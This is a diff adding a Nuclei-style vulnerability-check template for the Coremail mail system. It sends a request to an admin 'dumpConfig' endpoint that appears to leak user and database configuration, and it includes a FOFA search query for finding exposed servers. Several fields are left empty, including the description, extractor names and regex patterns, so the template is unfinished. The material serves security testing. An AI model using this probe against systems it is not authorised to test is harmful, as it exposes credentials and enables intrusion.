@@ -1,0 +1,43 @@
+id: coremail-database-unleak
+info:
+  name: coremail-database-unleak
+  author: sb    
+  severity: critical
+  description: 
+  metadata:
+    fofa-query: app="Coremail-邮件系统" && icon_hash="541942600"
+variables:
+  s1: '{{rand_base(5, "56789")}}'
+  str: '{{rand_base(4)}}'
+  rand: '{{rand_base(3)}}'
+  
+http:
+  - raw:
+    - |      
+      GET /mailsms/s?func=ADMIN:appState&dumpConfig=/ HTTP/1.1
+
+     
+    extractors:
+      - type: regex
+        name: 
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - ''
+
+      - type: regex
+        name: 
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - ''    
+    
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"User") && contains(body,"Database")'
+          
